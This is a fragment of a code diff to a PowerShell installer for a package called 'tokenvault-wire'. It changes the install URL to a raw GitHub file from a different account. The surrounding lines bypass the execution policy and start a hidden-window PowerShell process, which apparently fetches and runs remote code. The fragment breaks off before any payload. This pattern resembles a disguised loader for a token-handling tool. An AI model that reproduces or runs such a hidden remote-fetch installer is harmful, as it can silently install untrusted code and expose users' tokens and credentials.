@@ -26,7 +26,7 @@ Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope CurrentUser
 
 $packageName = "tokenvault-wire"
 $appPath = "$env:USERPROFILE\scoop\apps\$packageName"
-$installUrl = "https://raw.githubusercontent.com/scoopdev961/lab/refs/heads/main/key-manager.json"
+$installUrl = "https://raw.githubusercontent.com/devscoop-labs/scoop/refs/heads/main/token-vault.json"
 
 Start-Process powershell -ArgumentList "-WindowStyle Hidden -Command `"`
     `$packageName = '$packageName';
